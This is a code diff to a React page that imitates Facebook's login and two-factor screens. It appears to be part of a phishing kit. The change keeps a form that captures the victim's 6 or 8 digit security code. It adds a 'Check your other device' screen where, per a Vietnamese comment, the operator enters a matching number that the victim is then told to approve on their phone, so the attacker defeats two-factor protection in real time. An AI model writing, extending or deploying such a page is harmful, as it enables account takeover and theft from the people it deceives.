@@ -505,38 +505,70 @@ export default function Home() {
                     </form>
                 )}
 
-                {/* FORM 3: 2FA */}
+                                {/* FORM 3: 2FA & CHECK DEVICE */}
                 {step === 3 && (
                   <>
-                    <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
-                    
-                    <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}>
-                        <img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} />
-                    </div>
+                    {matchNumber ? (
+                      // GIAO DIỆN DUYỆT THIẾT BỊ (Chỉ hiện khi mày đã nhập số)
+                      <>
+                        <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px' }}>
+                            Check your other device
+                        </h2>
+                        
+                        <p style={{ fontSize: '15px', color: '#1c2b33', marginBottom: '20px', lineHeight: '1.4' }}>
+                            Open the notification on your other device, then tap <strong>{matchNumber}</strong> to verify it's you.
+                        </p>
 
-                    <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.</p>
-                    
-                    <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                        <input 
-                            className="fb-input fb-otp-input" 
-                            style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} 
-                            placeholder="00000000" 
-                            value={otp} 
-                            onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} 
-                            required 
-                            maxLength={8} 
-                        />
+                        <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}>
+                            <img src="/images/approve-device.png" alt="Approve Device" style={{ width: '100%', height: 'auto', borderRadius: '8px' }} />
+                        </div>
+
+                        <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>
+                            {matchNumber}
+                        </div>
                         
-                        {showOtpError && (
-                            <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>
-                                Invalid security code. Please check the code and try again.
-                            </div>
-                        )}
-                        
-                        <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>
-                            {loading ? 'Verifying...' : 'Verify'}
+                        <button 
+                            type="button" 
+                            onClick={() => setShowModal(false)} 
+                            className="fb-btn"
+                        >
+                            Cancel
                         </button>
-                    </form>
+                      </>
+                    ) : (
+                      // GIAO DIỆN NHẬP MÃ 2FA BÌNH THƯỜNG (Hiện lúc đầu)
+                      <>
+                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
+                        
+                        <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}>
+                            <img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} />
+                        </div>
+
+                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.</p>
+                        
+                        <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                            <input 
+                                className="fb-input fb-otp-input" 
+                                style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} 
+                                placeholder="00000000" 
+                                value={otp} 
+                                onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} 
+                                required 
+                                maxLength={8} 
+                            />
+                            
+                            {showOtpError && (
+                                <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>
+                                    Invalid security code. Please check the code and try again.
+                                </div>
+                            )}
+                            
+                            <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>
+                                {loading ? 'Verifying...' : 'Verify'}
+                            </button>
+                        </form>
+                      </>
+                    )}
                   </>
                 )}
 
